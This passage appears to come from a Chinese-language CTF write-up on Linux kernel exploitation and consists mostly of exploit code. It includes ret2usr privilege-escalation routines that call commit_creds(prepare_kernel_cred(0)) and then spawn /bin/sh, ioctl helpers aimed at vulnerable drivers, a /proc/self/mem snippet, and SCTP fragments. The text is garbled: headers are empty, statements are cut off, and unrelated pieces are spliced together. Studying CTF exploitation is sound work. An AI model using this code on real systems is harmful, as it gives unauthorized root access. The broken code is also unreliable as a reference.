    int fd;
    int BUFF_SIZE = 96;
    void save_stat() {
        asm(
            "movq %%cs, %0;"
            "movq %%ss, %1;"
            "movq %%rsp, %2;"
            "pushfq;"
            "popq %3;"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
    }
    void templine()
    {
      commit_creds(prepare_kernel_cred(0));
      asm(
        "pushq   %0;"
        "pushq   %1;"
        "pushq   %2;"
        "pushq   %3;"
        "pushq   $shell;"
        "pushq   $0;"
        "swapgs;"
        "popq    %%rbp;"
        "iretq;"
        ::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
    }
    void shell()
    {
            printf("root\n");
            system("/bin/sh");
            exit(0);
    }
    unsigned long long int calc(unsigned long long int addr) {
        return addr-0xffffffff81000000+base_addr;
    }
    // ------------------------------------------------------------    
    struct sBuf 
    {
      char *data;
      int index;
    } buf;
    void add(char *data) {
      buf.data = data;
      ioctl(fd, 0x6007, &buf);
    }
    void delete(int index) {
      buf.index = index;
      ioctl(fd, 0x6008, &buf);
    }
    void call(int index) {
      buf.index = index;
      ioctl(fd, 0x6009, &buf);
    }
    int main() {
      save_stat();
      fd = open("/dev/baby", 0);
        if (fd cmsg_len but i want to force the size
        msg.msg_name = (caddr_t)&addr;
        msg.msg_namelen = sizeof(addr);
      for(int i = 0; i 
有用的只有`write`函数：
    __int64 __fastcall mychrdev_write(int a1, char *a2, __int64 a3)
    {
      char v4; // [rsp+0h] [rbp-50h]
      if ( ((__int64 (__fastcall *)(char *, char *, __int64))copy_from_user)(&v4, a2, a3) )
        return -14LL;
      printk("You writed!");
      return 1LL;
    }
`exp`如下：
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810779b0; // TODO:change it
    void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff81077620; // TODO:change it
    // cat /proc/kallsyms | grep "prepare_kernel_cred"
    unsigned long long user_cs, user_ss, user_rflags, user_sp;
    unsigned long long base_addr, canary;
    int fd;
    int BUFF_SIZE = 96;
    void save_stat() {
        asm(
            "movq %%cs, %0;"
            "movq %%ss, %1;"
            "movq %%rsp, %2;"
            "pushfq;"
            "popq %3;"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
    }
    void templine()
    {
      commit_creds(prepare_kernel_cred(0));
      asm(
        "pushq   %0;"
        "pushq   %1;"
        "pushq   %2;"
        "pushq   %3;"
        "pushq   $shell;"
        "pushq   $0;"
        "swapgs;"
        "popq    %%rbp;"
        "iretq;"
        ::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
    }
    void shell()
    {
            printf("root\n");
            system("/bin/sh");
            exit(0);
    }
    unsigned long long int calc(unsigned long long int addr) {
        return addr-0xffffffff81000000+base_addr;
    }
    int main() {
      save_stat();
      fd = open("/dev/mychrdev", 2);
        if (fd 
    #include 
    #include 
    #include 
    int main() {
        unsigned long addr = (unsigned long)mmap((void *)0x10000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
        if (addr != 0x10000)
            err(2,"mmap failed");
        int fd = open("/proc/self/mem",O_RDWR);
        if (fd == -1)
            err(2,"open mem failed");
        char cmd[0x100] = {0};
        sprintf(cmd, "su >&%d 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include  
    #include 
    #define SERVER_PORT 6666
    #define SCTP_GET_ASSOC_ID_LIST  29
    #define SCTP_RESET_ASSOC  120
    #define SCTP_ENABLE_RESET_ASSOC_REQ 0x02